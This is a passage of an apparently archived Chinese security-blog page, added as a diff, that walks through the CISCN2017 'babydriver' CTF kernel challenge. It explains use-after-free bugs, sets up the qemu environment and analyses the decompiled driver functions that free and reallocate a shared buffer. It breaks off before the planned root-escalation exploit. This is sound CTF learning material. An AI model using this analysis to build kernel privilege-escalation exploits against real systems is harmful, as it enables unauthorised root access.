@@ -1,0 +1,332 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="Tr0e"><meta name="copyright" content="Tr0e"><meta name="generator" content="Hexo 5.4.2"><meta name="theme" content="hexo-theme-yun"><title>Android内核层驱动程序UAF漏洞提权实例 | Cyber Security</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.3.3/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
+  [".post-card",".markdown-body img"].forEach((target)=> {
+    ScrollReveal().reveal(target);
+  })
+}
+document.addEventListener("DOMContentLoaded", initScrollReveal);
+document.addEventListener("pjax:success", initScrollReveal);
+</script><link rel="icon" type="image/svg+xml" href="/yun.svg"><link rel="mask-icon" href="/yun.svg" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
+    window.Yun = {}
+    window.CONFIG = {"hostname":"tr0e.github.io","root":"/","title":["Tr0e","Blog"],"version":"1.10.4","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}.","hits":"${hits} results found","hits_time":"${hits} results found in ${time} ms"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","fireworks":{"colors":null},"vendors":{"darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
+  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/hexo-theme-yun.js" type="module"></script><link rel="alternate" href="/atom.xml" title="Cyber Security" type="application/atom+xml"><meta name="description" content="前言自 2021 年 11 月从国企离职并入职互联网私企后，发现博客很少更新了……自然不是因为开始躺平了（菜鸡的学习之路还很漫长…），而是新的平台充满挑战，需要学习的东西实在太多了（所以一直加班中…），加上很多内部学习材料和内容不可在公司外网传播，所以就很少写 CSDN 博文了。但是稍有时间还是要保持写博文习惯的hh，个人觉得这不仅是对个人技术成长路线的记录，也是一种促使自己不断保持学习状态的好习">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Android内核层驱动程序UAF漏洞提权实例">
+<meta property="og:url" content="https://tr0e.github.io/Android%E5%86%85%E6%A0%B8%E5%B1%82%E9%A9%B1%E5%8A%A8%E7%A8%8B%E5%BA%8FUAF%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83%E5%AE%9E%E4%BE%8B/index.html">
+<meta property="og:site_name" content="Cyber Security">
+<meta property="og:description" content="前言自 2021 年 11 月从国企离职并入职互联网私企后，发现博客很少更新了……自然不是因为开始躺平了（菜鸡的学习之路还很漫长…），而是新的平台充满挑战，需要学习的东西实在太多了（所以一直加班中…），加上很多内部学习材料和内容不可在公司外网传播，所以就很少写 CSDN 博文了。但是稍有时间还是要保持写博文习惯的hh，个人觉得这不仅是对个人技术成长路线的记录，也是一种促使自己不断保持学习状态的好习">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/070144a6324040fa90e685d342901474.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVHIwZQ==,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/d59a93e263dc409b98d51226e7d0512b.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/a777d5fe619c4f7ba05ddb00906861d1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/86b4edb886b14ccfb83ff2e07a0352c6.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/e2d65c2fbc4b41d1a31234cb94d97911.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVHIwZQ==,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/3483b77d524c47f18b4e499ae1e17a5f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVHIwZQ==,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/e604e2da0f264af9974decbacb9d6613.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVHIwZQ==,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/e02b212a5f994a16a73ec454e5b10e05.png">
+<meta property="article:published_time" content="2022-02-27T16:04:19.000Z">
+<meta property="article:modified_time" content="2022-06-15T16:13:18.149Z">
+<meta property="article:author" content="Tr0e">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/070144a6324040fa90e685d342901474.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVHIwZQ==,size_20,color_FFFFFF,t_70,g_se,x_16"><script>(function() {
+  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
+  const setting = localStorage.getItem('darken-mode') || 'auto'
+  if (setting === 'dark' || (prefersDark && setting !== 'light'))
+    document.documentElement.classList.toggle('dark', true)
+})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
+IconifyProviders = {
+  // Empty prefix: overwrite default API provider configuration
+  '': {
+    // Use custom API first, use Iconify public API as backup
+    resources: [
+        'https://api.iconify.design',
+    ],
+    // Wait for 1 second before switching API hosts
+    rotate: 1000,
+  },
+};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="Table of Contents"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="Overview"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="Tr0e"><img width="96" loading="lazy" src="/images/Tr0e.jpg" alt="Tr0e"></a><div class="site-author-name"><a href="/about/">Tr0e</a></div><span class="site-name">Cyber Security</span><sub class="site-subtitle"></sub><div class="site-description"></div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="Home"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="Archives"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">8</span></a></div><div class="site-state-item"><a href="/categories/" title="Categories"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">4</span></a></div><div class="site-state-item"><a href="/tags/" title="Tags"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">0</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/about/" title="About Me" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#UAF%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.</span> <span class="toc-text">UAF漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#babydriver"><span class="toc-number">3.</span> <span class="toc-text">babydriver</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">3.1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">3.2.</span> <span class="toc-text">漏洞分析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8F%90%E6%9D%83exp"><span class="toc-number">4.</span> <span class="toc-text">提权exp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#cred%E7%BB%93%E6%9E%84"><span class="toc-number">4.1.</span> <span class="toc-text">cred结构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fork-%E5%87%BD%E6%95%B0"><span class="toc-number">4.2.</span> <span class="toc-text">fork()函数</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="https://tr0e.github.io/Android%E5%86%85%E6%A0%B8%E5%B1%82%E9%A9%B1%E5%8A%A8%E7%A8%8B%E5%BA%8FUAF%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83%E5%AE%9E%E4%BE%8B/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="Tr0e"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Cyber Security"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">Android内核层驱动程序UAF漏洞提权实例</h1><div class="post-meta"><div class="post-time"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="Created: 2022-02-28 00:04:19" itemprop="dateCreated datePublished" datetime="2022-02-28T00:04:19+08:00">2022-02-28</time></div><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">漏洞分析</span></a></span></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>自 2021 年 11 月从国企离职并入职互联网私企后，发现博客很少更新了……自然不是因为开始躺平了（菜鸡的学习之路还很漫长…），而是新的平台充满挑战，需要学习的东西实在太多了（所以一直加班中…），加上很多内部学习材料和内容不可在公司外网传播，所以就很少写 CSDN 博文了。但是稍有时间还是要保持写博文习惯的hh，个人觉得这不仅是对个人技术成长路线的记录，也是一种促使自己不断保持学习状态的好习惯。</p>
+<p>言归正传，换工作后开始从事移动终端安全的方向，最近在学习 Android 内核层和驱动的漏洞挖掘，刚好刷了一道关于内核提权的 CTF PWN 题目，颇有收益（太菜了…），在此学习记录下。</p>
+<h1 id="UAF漏洞"><a href="#UAF漏洞" class="headerlink" title="UAF漏洞"></a>UAF漏洞</h1><blockquote>
+<p>在计算机编程领域中，迷途指针（或称悬空指针、野指针），指的是不指向任何合法的对象的指针。当指针当所指向的对象被释放或者收回，但是对该指针没有作任何的修改，以至于该指针仍旧指向已经回收的内存地址，此情况下该指针便称迷途指针。若操作系统将这部分已经释放的内存重新分配给另外一个进程，而原来的程序重新引用现在的迷途指针并修改内存数据，则将产生无法预料的后果。</p>
+</blockquote>
+<p>UAF（Use After Free）漏洞，顾名思义，指的就是当一个内存块被释放之后其指针再次被使用，可能会导致意想不到的后果。分为以下三种情况：</p>
+<ol>
+<li>内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃；</li>
+<li>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运转；</li>
+<li>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题。</li>
+</ol>
+<p>而我们一般所指的 Use After Free 漏洞主要是后两种。此外，一般称被释放后没有被设置为 NULL 的内存指针为悬空指针 dangling pointer。</p>
+<p>下面通过一个简单的 C 语言程序来直观地感受下 UAF 漏洞：</p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">char</span> <span class="token operator">*</span>p1<span class="token punctuation">;</span>
+    p1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//申请内存空间</span>
+    <span class="token function">memcpy</span><span class="token punctuation">(</span>p1<span class="token punctuation">,</span><span class="token string">"hello"</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"p1 addr:%x,%s\n"</span><span class="token punctuation">,</span>p1<span class="token punctuation">,</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">free</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//释放 p1 指针所指向地内存空间</span>
+    <span class="token keyword">char</span> <span class="token operator">*</span>p2<span class="token punctuation">;</span>
+    p2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//二次申请内存空间，与第一次大小相同，申请到了同一块内存，即p2=p1</span>
+    <span class="token function">memcpy</span><span class="token punctuation">(</span>p1<span class="token punctuation">,</span><span class="token string">"world"</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">//尝试对p1指针所指向的对内存空间进行修改</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"p2 addr:%x,%s\n"</span><span class="token punctuation">,</span>p2<span class="token punctuation">,</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">//验证p2指针地址是否与p1相同，以及p1内存空间释放后是否能正常对p1指针进行读写</span>
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+<p>运行结果如图所示：<br><img src="https://img-blog.csdnimg.cn/070144a6324040fa90e685d342901474.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVHIwZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"><br>可以看到，p1 与 p2 指针地址相同，p1 指针释放后，p2 申请相同的大小的内存时，操作系统会将之前给 p1 的地址分配给 p2，修改 p1 的内存空间，p2 也被修改了。</p>
+<p><strong>UAF 漏洞的原理</strong></p>
+<p>需要先介绍一下堆分配内存的原则，Linux 中进程分配内存的两种方式：brk 和 mmap。当程序使用 malloc 申请内存的时候，如果小于 256K，使用 brk 方式，将数据段 (.data) 的最高地址指针<code>_edata</code>往高地址推；如果大于 256，使用 mmap 方式，堆和栈之间找一块空闲内存分配。</p>
+<p>应用程序调用 free() 函数来释放内存空间时，如果内存块小于 256kb， dlmalloc 并不马上将内存块释放回内存，而是将内存块标记为空闲状态。这么做的原因有两个：一是内存块不一定能马上释放会内核（比如内存块不是位于堆顶端），二是供应用程序下次申请内存使用（这是主要原因）。当 dlmalloc 中空闲内存量达到一定值时 dlmalloc 才将空闲内存释放会内核。如果应用程序释放的内存大于 256kb，dlmalloc 马上调用 munmap() 释放内存（dlmalloc 不会缓存大于 256kb 的内存块，因为这样的内存块太大了，最好不要长期占用这么大的内存资源）。</p>
+<p>所以 UAF 漏洞简单来说，就是程序第一次申请的内存空间在释放过后没有进行内存回收，导致下次申请内存的时候再次使用该内存块，使得以前的内存指针可以访问修改过的内存。</p>
+<h1 id="babydriver"><a href="#babydriver" class="headerlink" title="babydriver"></a>babydriver</h1><p>下面通过一道 2017 年全国大学生信息安全竞赛的 PWN 题目 babydriver 来学习下内核层驱动程序 UAF 漏洞的提权利用。题目材料 Github 获取地址：<a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/kernel/CISCN2017-babydriver">CISCN2017-babydriver</a>。</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>来看下题目的三个附件：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/d59a93e263dc409b98d51226e7d0512b.png" alt="在这里插入图片描述" loading="lazy"><br>CTF 比赛中的内核题目通常也都由这几个部分组成：<br>| 文件        | 作用                                 |<br>| ———– | ———————————— |<br>| boot.sh     | qemu-system 脚本，用于启动内核虚拟机 |<br>| rootfs.cpio | 虚拟机的文件系统                     |<br>| bzImage     | 内核镜像                             |</p>
+<p>1、开始分析题目，先来看下 qemu 虚拟机启动脚本的内容（可以看到指定了 rootfs.cpio 作为内核启动的文件系统，同时使用 bzImage 作为 kernel 映像）：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>
+
+qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append <span class="token string">'console=ttyS0 root=/dev/ram oops=panic panic=1'</span> -enable-kvm -monitor /dev/null -m 64M --nographic  -smp <span class="token assign-left variable">cores</span><span class="token operator">=</span><span class="token number">1</span>,threads<span class="token operator">=</span><span class="token number">1</span> -cpu kvm64,+smep</code></pre>
+<p>需要先安装 qemu 环境（Ubuntu 虚拟机中直接执行命令 <code>sudo apt install qemu</code>即可安装），然后执行<code>./boot.sh</code> 即可启动 qemu 虚拟机：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/a777d5fe619c4f7ba05ddb00906861d1.png" alt="在这里插入图片描述" loading="lazy"><br>显然题目需要进行提权，才能获取 flag。执行 <code>cat init</code> 发现系统启动过程中加载了驱动文件<code>/lib/modules/4.4.72/babydriver.ko</code>，结合题目名称 babydriver 推断需要提取 babydriver.ko 驱动文件进行分析，借助其漏洞进行提权。</p>
+<p>2、为了提取出 babydriver.ko 驱动程序，将题目提供的附件—— rootfs.cio 文件系统映像进行解包，写一个解包的脚本（或者手动逐条执行以下命令也可以）：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># sudo chmod a+x dec.sh</span>
+<span class="token comment"># ./dec.sh</span>
+<span class="token function">mkdir</span> fs
+<span class="token builtin class-name">cd</span> fs
+<span class="token function">cp</span> <span class="token punctuation">..</span>/rootfs.cpio ./rootfs.cpio.gz
+gunzip ./rootfs.cpio.gz 
+cpio -idmv <span class="token operator">&lt;</span> rootfs.cpio
+<span class="token function">rm</span> rootfs.cpio</code></pre>
+<p>解包后获取到的文件系统及 babydriver.ko 驱动程序如下：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/86b4edb886b14ccfb83ff2e07a0352c6.png" alt="在这里插入图片描述" loading="lazy"></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>将 babydriver.ko 驱动程序文件拖入 IDA 64 进行逆向分析，发现 babyioctl、babayread、babyopen 等系统调用函数：<br><img src="https://img-blog.csdnimg.cn/e2d65c2fbc4b41d1a31234cb94d97911.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVHIwZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"><br>核心函数反汇编后的伪代码可汇总如下：</p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">//释放babydev_struct</span>
+<span class="token keyword">int</span> __fastcall <span class="token function">babyrelease</span><span class="token punctuation">(</span>inode <span class="token operator">*</span>inode<span class="token punctuation">,</span> file <span class="token operator">*</span>filp<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token function">_fentry__</span><span class="token punctuation">(</span>inode<span class="token punctuation">,</span> filp<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">kfree</span><span class="token punctuation">(</span>babydev_struct<span class="token punctuation">.</span>device_buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token string">"device release\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token comment">//申请一块大小为 0x40 字节的空间，地址存储在全局变量babydev_struct.device_buf 上，并更新 babydev_struct.device_buf_len</span>
+<span class="token keyword">int</span> __fastcall <span class="token function">babyopen</span><span class="token punctuation">(</span>inode <span class="token operator">*</span>inode<span class="token punctuation">,</span> file <span class="token operator">*</span>filp<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token function">_fentry__</span><span class="token punctuation">(</span>inode<span class="token punctuation">,</span> filp<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  babydev_struct<span class="token punctuation">.</span>device_buf <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">kmem_cache_alloc_trace</span><span class="token punctuation">(</span>kmalloc_caches<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">37748928LL</span><span class="token punctuation">,</span> <span class="token number">64LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  babydev_struct<span class="token punctuation">.</span>device_buf_len <span class="token operator">=</span> <span class="token number">64LL</span><span class="token punctuation">;</span>
+  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token string">"device open\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token comment">//定义了 0x10001 的命令，可以释放全局变量 babydev_struct中的device_buf，再根据用户传递的 size 重新申请一块内存，并设置 device_buf_len</span>
+__int64 __fastcall <span class="token function">babyioctl</span><span class="token punctuation">(</span>file <span class="token operator">*</span>filp<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> command<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> __int64 arg<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token class-name">size_t</span> v3<span class="token punctuation">;</span> <span class="token comment">// rdx</span>
+  <span class="token class-name">size_t</span> v4<span class="token punctuation">;</span> <span class="token comment">// rbx</span>
+  __int64 result<span class="token punctuation">;</span> <span class="token comment">// rax</span>
+
+  <span class="token function">_fentry__</span><span class="token punctuation">(</span>filp<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>command<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  v4 <span class="token operator">=</span> v3<span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> command <span class="token operator">==</span> <span class="token number">65537</span> <span class="token punctuation">)</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token function">kfree</span><span class="token punctuation">(</span>babydev_struct<span class="token punctuation">.</span>device_buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    babydev_struct<span class="token punctuation">.</span>device_buf <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">_kmalloc</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> <span class="token number">37748928LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    babydev_struct<span class="token punctuation">.</span>device_buf_len <span class="token operator">=</span> v4<span class="token punctuation">;</span>
+    <span class="token function">printk</span><span class="token punctuation">(</span><span class="token string">"alloc done\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    result <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">else</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_2EB<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    result <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">22LL</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token comment">//从 buffer 拷贝到全局变量中</span>
+<span class="token class-name">ssize_t</span> __fastcall <span class="token function">babywrite</span><span class="token punctuation">(</span>file <span class="token operator">*</span>filp<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>buffer<span class="token punctuation">,</span> <span class="token class-name">size_t</span> length<span class="token punctuation">,</span> <span class="token class-name">loff_t</span> <span class="token operator">*</span>offset<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token class-name">size_t</span> v4<span class="token punctuation">;</span> <span class="token comment">// rdx</span>
+  <span class="token class-name">ssize_t</span> result<span class="token punctuation">;</span> <span class="token comment">// rax</span>
+  <span class="token class-name">ssize_t</span> v6<span class="token punctuation">;</span> <span class="token comment">// rbx</span>
+
+  <span class="token function">_fentry__</span><span class="token punctuation">(</span>filp<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>babydev_struct<span class="token punctuation">.</span>device_buf <span class="token punctuation">)</span>
+    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1LL</span><span class="token punctuation">;</span>
+  result <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">2LL</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> babydev_struct<span class="token punctuation">.</span>device_buf_len <span class="token operator">></span> v4 <span class="token punctuation">)</span>
+  <span class="token punctuation">&#123;</span>
+    v6 <span class="token operator">=</span> v4<span class="token punctuation">;</span>
+    <span class="token function">copy_from_user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    result <span class="token operator">=</span> v6<span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token comment">//从全局变量拷贝到 buffer 中</span>
+<span class="token class-name">ssize_t</span> __fastcall <span class="token function">babyread</span><span class="token punctuation">(</span>file <span class="token operator">*</span>filp<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>buffer<span class="token punctuation">,</span> <span class="token class-name">size_t</span> length<span class="token punctuation">,</span> <span class="token class-name">loff_t</span> <span class="token operator">*</span>offset<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token class-name">size_t</span> v4<span class="token punctuation">;</span> <span class="token comment">// rdx</span>
+  <span class="token class-name">ssize_t</span> result<span class="token punctuation">;</span> <span class="token comment">// rax</span>
+  <span class="token class-name">ssize_t</span> v6<span class="token punctuation">;</span> <span class="token comment">// rbx</span>
+
+  <span class="token function">_fentry__</span><span class="token punctuation">(</span>filp<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
